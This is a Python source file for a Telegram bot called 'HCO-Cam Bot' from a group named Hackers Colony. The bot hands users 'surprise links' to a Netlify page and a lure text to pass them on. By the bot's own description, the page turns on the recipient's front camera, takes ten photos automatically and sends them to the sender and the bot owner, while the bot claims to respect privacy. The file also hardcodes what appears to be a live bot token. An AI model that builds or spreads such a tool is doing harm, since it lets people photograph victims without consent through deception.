#!/usr/bin/env python3
import logging
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode

# ========== CONFIGURATION ==========
BOT_TOKEN = "8226782560:AAEEqVHnfwAURU9pm3-VQc5OHLTdhwn_dNI"
OWNER_CHAT_ID = 8215819954
CHANNEL_USERNAME = "@HackersColony"
OWNER_USERNAME = "@Hackers_Colony_Official"
NETLIFY_URL = "https://gleaming-marigold-231ffe.netlify.app"
CHANNEL_LINK = "https://t.me/HackersColony"

# ========== LOGGING ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== START COMMAND ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    welcome_text = f"""
👋 <b>Hey {user.first_name}!</b> 🤗

<b>Welcome to HCO-Cam Bot by Hackers Colony Team</b> 🚀

<b>To use this bot, first join our channel:</b>
"""
    
    keyboard = [
        [InlineKeyboardButton("📢 JOIN OUR CHANNEL", url=CHANNEL_LINK)],
        [InlineKeyboardButton("✅ I'VE JOINED", callback_data="check_join")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_text,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

# ========== CHECK CHANNEL JOIN ==========
async def check_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    try:
        chat_member = await context.bot.get_chat_member(CHANNEL_USERNAME, user_id)
        
        if chat_member.status in ['member', 'administrator', 'creator']:
            await show_main_menu(query)
        else:
            await query.edit_message_text(
                "❌ <b>You haven't joined our channel yet!</b>\n\n"
                "Please join first, then click below:",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📢 JOIN CHANNEL", url=CHANNEL_LINK)],
                    [InlineKeyboardButton("✅ CHECK AGAIN", callback_data="check_join")]
                ])
            )
    except Exception as e:
        logger.error(f"Error checking membership: {e}")
        await query.edit_message_text(
            "⚠️ <b>Could not verify</b>\n\nPlease try again.",
            parse_mode=ParseMode.HTML
        )

# ========== MAIN MENU ==========
async def show_main_menu(query):
    menu_text = """
<b>🎮 BOT FEATURES</b>

Choose what you want to do:
"""
    
    keyboard = [
        [InlineKeyboardButton("🔗 GENERATE SURPRISE LINK", callback_data="generate_link")],
        [InlineKeyboardButton("👤 CONTACT OWNER", callback_data="contact_owner")],
        [InlineKeyboardButton("ℹ️ ABOUT BOT", callback_data="about")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        menu_text,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

# ========== GENERATE LINK ==========
async def generate_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    user_name = query.from_user.first_name
    
    # Create unique link
    unique_link = f"{NETLIFY_URL}?uid={user_id}"
    
    message_text = f"""
<b>🎁 YOUR SURPRISE LINK IS READY!</b>

Send this link to friends for a fun surprise:

<code>{unique_link}</code>

<b>What will happen:</b>
1. 🎁 Surprise gift reveal
2. 📸 Front camera activates
3. 🔟 10 photos auto-captured
4. 📤 Photos sent to both of us

⚠️ <i>Works on mobile browsers with camera access</i>
"""
    
    keyboard = [
        [InlineKeyboardButton("📤 SHARE LINK", 
            url=f"https://t.me/share/url?url={unique_link}&text=🎁+Someone+has+a+surprise+for+you!+Click+to+unlock!")],
        [InlineKeyboardButton("⬅️ BACK TO MENU", callback_data="back_to_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        message_text,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

# ========== CONTACT OWNER ==========
async def contact_owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    message_text = f"""
<b>👤 CONTACT INFORMATION</b>

<b>Bot Owner:</b> {OWNER_USERNAME}
<b>Channel:</b> {CHANNEL_USERNAME}
<b>Support:</b> @HackersColony

📨 <i>Feel free to message for queries!</i>
"""
    
    keyboard = [
        [InlineKeyboardButton("💬 MESSAGE OWNER", url=f"https://t.me/{OWNER_USERNAME[1:]}")],
        [InlineKeyboardButton("📢 JOIN CHANNEL", url=CHANNEL_LINK)],
        [InlineKeyboardButton("⬅️ BACK TO MENU", callback_data="back_to_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        message_text,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

# ========== ABOUT ==========
async def about(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    message_text = """
<b>🤖 ABOUT HCO-CAM BOT</b>

<b>✨ Developed by:</b> Hackers Colony Team
<b>🎯 Purpose:</b> Fun interactive bot with real camera
<b>⭐ Features:</b>
• Generate surprise links 🎁
• Real front camera capture 📸
• Auto image sending to both 📤
• Beautiful web interface 💫
• Completely FREE! 🆓

🔒 <i>Your privacy is important. Images only go to you and bot owner.</i>

📢 <b>Join our channel for more:</b> @HackersColony
"""
    
    keyboard = [
        [InlineKeyboardButton("📢 JOIN CHANNEL", url=CHANNEL_LINK)],
        [InlineKeyboardButton("⬅️ BACK TO MENU", callback_data="back_to_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        message_text,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

# ========== BUTTON HANDLER ==========
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    
    if data == "check_join":
        await check_join(update, context)
    elif data == "generate_link":
        await generate_link(update, context)
    elif data == "contact_owner":
        await contact_owner(update, context)
    elif data == "about":
        await about(update, context)
    elif data == "back_to_menu":
        await show_main_menu(query)

# ========== MAIN FUNCTION ==========
def main():
    print("""
    ╔══════════════════════════════╗
    ║    HCO-CAM BOT STARTING      ║
    ║    By Hackers Colony         ║
    ╚══════════════════════════════╝
    """)
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Run bot
    print(f"✅ Bot is running...")
    print(f"🌐 Web URL: {NETLIFY_URL}")
    print(f"👤 Owner ID: {OWNER_CHAT_ID}")
    print("Press Ctrl+C to stop\n")
    
    application.run_polling()

if __name__ == '__main__':
    main()
